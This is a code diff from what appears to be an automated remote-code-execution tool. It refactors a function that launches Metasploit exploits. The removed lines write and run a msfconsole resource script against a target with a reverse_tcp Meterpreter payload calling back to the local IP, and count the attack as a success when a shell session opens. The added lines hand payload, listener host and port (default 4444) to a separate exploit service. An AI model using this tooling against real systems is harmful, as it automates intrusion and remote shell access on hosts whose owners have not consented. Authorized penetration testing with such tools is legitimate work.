@@ -387,68 +387,25 @@ async function attemptRCE(target, vulnerability) {
 }
 
 /**
- * Execute Metasploit exploit
+ * Execute Metasploit exploit (using enhanced Metasploit service)
  */
 async function executeMetasploitExploit(module, target, port, vulnerability) {
   try {
-    logger.step(`Executing Metasploit: ${module}`);
+    // Use enhanced Metasploit service
+    const metasploitService = require('./metasploit/metasploit.service');
     
-    const fs = require('fs-extra');
-    const path = require('path');
-    
-    // Check if msfconsole is available
-    const msfStatus = await toolRegistry.ensureToolAvailable('msfconsole');
-    if (!msfStatus.available) {
-      logger.warn('Metasploit not available - cannot execute exploit');
-      return { success: false, error: 'Metasploit not installed' };
-    }
-    
-    // Get local IP for reverse shells
-    const localIP = getLocalIP();
-    
-    // Create Metasploit resource script
-    const msfScript = `use ${module}
-set RHOSTS ${target}
-${port ? `set RPORT ${port}` : ''}
-set LHOST ${localIP || '127.0.0.1'}
-set PAYLOAD linux/x86/meterpreter/reverse_tcp
-exploit -j
-`;
-    
-    const scriptPath = path.join(process.env.WORK_DIR || './work', `msf_${Date.now()}.rc`);
-    await fs.ensureDir(path.dirname(scriptPath));
-    await fs.writeFile(scriptPath, msfScript);
-    
-    logger.tool('msfconsole', `Running ${module}`, `against ${target}:${port}`);
-    logger.info(`Metasploit script created: ${scriptPath}`);
-    
-    const result = await toolExecutor.executeTool('msfconsole', ['-r', scriptPath], {
-      timeout: 300000, // 5 minutes
-    });
-    
-    // Check if exploit was successful
-    const output = result.output || result.stdout || '';
-    const success = output.includes('Meterpreter session') || 
-                    output.includes('Command shell session') ||
-                    output.includes('Session opened') ||
-                    output.includes('session 1 opened');
-    
-    if (success) {
-      logger.success('🎯 Metasploit exploit successful - session opened!');
-      return {
-        success: true,
-        output: output,
-        exploit: module,
-        method: 'metasploit',
-        session: 'active',
-      };
-    }
-    
-    return {
-      success: false,
-      output: output,
-      error: 'Exploit executed but no session opened',
+    // Prepare options
+    const options = {
+      service: vulnerability?.service,
+      targetOS: vulnerability?.targetOS || 'linux',
+      payload: vulnerability?.payload,
+      lhost: vulnerability?.lhost,
+      lport: vulnerability?.lport || 4444,
+      options: vulnerability?.options || {},
     };
+    
+    // Execute using enhanced service
+    return await metasploitService.executeExploit(module, target, port, options);
   } catch (error) {
     logger.error('Error executing Metasploit exploit:', error);
     return {
